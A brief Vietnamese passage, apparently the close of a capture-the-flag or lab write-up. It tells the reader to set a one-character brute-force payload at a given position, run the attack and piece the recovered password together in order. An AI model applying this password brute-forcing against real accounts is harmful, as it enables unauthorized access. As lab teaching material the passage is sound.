- Vị trí `2 - a` chọn `Brute forcer` Min length = Max Length = 1
- Start attack, ghép lại password theo thứ tự

---
Goodluck! 🍀🍀🍀